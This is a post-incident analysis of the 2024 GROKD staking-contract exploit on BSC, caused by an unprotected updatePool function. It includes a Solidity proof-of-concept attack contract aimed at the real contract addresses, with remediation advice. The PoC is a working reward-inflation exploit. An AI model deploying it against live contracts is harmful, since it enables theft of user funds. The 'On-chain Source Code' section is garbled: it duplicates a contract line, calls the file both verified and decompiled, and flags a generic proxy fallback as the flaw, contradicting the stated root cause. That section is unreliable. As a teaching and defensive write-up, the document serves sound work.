# GROKD — Reward Inflation via Missing Access Control on updatePool Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | GROKD |
| **Chain** | BSC |
| **Loss** | ~150 BNB |
| **GROKD Token** | [0xa4133feD](https://bscscan.com/address/0xa4133feD73Ea3361f2f928f98313b1e1e5049612) |
| **LP Pair** | [0x8AF65d91](https://bscscan.com/address/0x8AF65d9114DfcCd050e7352D77eeC98f40c42CFD) |
| **Vulnerable Contract** | [Deposit 0x31d3231c](https://bscscan.com/address/0x31d3231cDa62C0b7989b488cA747245676a32D81) |
| **Root Cause** | No access control on `updatePool(uint256, PoolInfo calldata)`, allowing `rewardPerBlock` to be set to 48 million ether; attacker deposited LP tokens then called `update()` + `reward()` to claim inflated GROKD rewards |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/GROKD_exp.sol) |

---

## 1. Vulnerability Overview

The `updatePool()` function of the GROKD staking contract allows external callers to modify pool parameters (`rewardPerBlock`, `startBlock`, `endBlock`) without any access control. The attacker set `rewardPerBlock` to 48,000,000 ether, deposited LP tokens, then called `update()` and `reward()` to claim an astronomically inflated GROKD reward.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no access control on updatePool
struct PoolInfo {
    uint256 rewardPerBlock;
    uint256 startBlock;
    uint256 endBlock;
    // ...
}

function updatePool(uint256 poolId, PoolInfo calldata poolInfo) external {
    // No onlyOwner — anyone can modify pool parameters
    pools[poolId] = poolInfo;
}

function update() external {
    // Reward calculated based on rewardPerBlock * (currentBlock - lastBlock)
    uint256 reward = pools[0].rewardPerBlock * blockDiff;
    pendingRewards[msg.sender] += reward;
}

// ✅ Safe code: only owner can call updatePool
function updatePool(uint256 poolId, PoolInfo calldata poolInfo) external onlyOwner {
    require(poolInfo.rewardPerBlock <= MAX_REWARD_PER_BLOCK, "reward too high");
    pools[poolId] = poolInfo;
    emit PoolUpdated(poolId, poolInfo);
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: GROKD_decompiled.sol
contract GROKD_Proxy {
contract GROKD_Proxy {
    // EIP-1967 implementation slot
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    fallback() external payable {  // ❌ Vulnerability
        // Delegates call to implementation via delegatecall
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Acquire LP tokens via Uniswap
  │
  ├─→ [2] depositFromIDO(attacker, lpAmount)
  │         └─ Deposit LP tokens
  │
  ├─→ [3] updatePool(0, {rewardPerBlock: 48_000_000e18, ...})
  │         └─ No access control — reward rate set to extreme value
  │
  ├─→ [4] update() — accumulate rewards based on elapsed blocks
  │         └─ rewardPerBlock 48M * blockDiff = astronomical reward
  │
  ├─→ [5] reward() — withdraw accumulated GROKD rewards
  │
  ├─→ [6] Swap GROKD → BNB
  │
  └─→ [7] ~150 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IGROKDDeposit {
    struct PoolInfo {
        uint256 rewardPerBlock;
        uint256 startBlock;
        uint256 endBlock;
    }

    function updatePool(uint256 poolId, PoolInfo calldata poolInfo) external;
    function depositFromIDO(address user, uint256 amount) external;
    function update() external;
    function reward() external;
}

contract AttackContract {
    IGROKDDeposit constant deposit = IGROKDDeposit(0x31d3231cDa62C0b7989b488cA747245676a32D81);
    IERC20        constant GROKD   = IERC20(0xa4133feD73Ea3361f2f928f98313b1e1e5049612);
    IERC20        constant lpToken = IERC20(0x8AF65d9114DfcCd050e7352D77eeC98f40c42CFD);

    function testExploit() external {
        // [1] Acquire LP tokens and deposit
        uint256 lpBal = lpToken.balanceOf(address(this));
        deposit.depositFromIDO(address(this), lpBal);

        // [2] Set rewardPerBlock to 48M ether (no access control)
        IGROKDDeposit.PoolInfo memory info = IGROKDDeposit.PoolInfo({
            rewardPerBlock: 48_000_000e18,
            startBlock: block.number - 1,
            endBlock: block.number + 100
        });
        deposit.updatePool(0, info);

        // [3] Update and withdraw rewards
        deposit.update();
        deposit.reward();

        // [4] Swap GROKD → BNB
        swapGROKDToBNB(GROKD.balanceOf(address(this)));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control + Reward Inflation |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct call to updatePool) |
| **DApp Category** | Staking Reward Contract |
| **Impact** | Full reward pool drained (~150 BNB) |

## 6. Remediation Recommendations

1. **updatePool onlyOwner**: Restrict pool parameter modifications to the owner only
2. **rewardPerBlock cap**: Set a reasonable maximum reward rate ceiling
3. **Apply timelock**: Add timelock delay to pool parameter changes
4. **depositFromIDO access control**: Restrict calls to approved IDO contracts only

## 7. Lessons Learned

- Admin functions (`updatePool`) in staking contracts must always have access control applied.
- Parameters such as `rewardPerBlock` without a maximum cap become a vector for unbounded reward issuance.
- Adding a timelock to admin functions allows the community to detect malicious parameter changes before they take effect.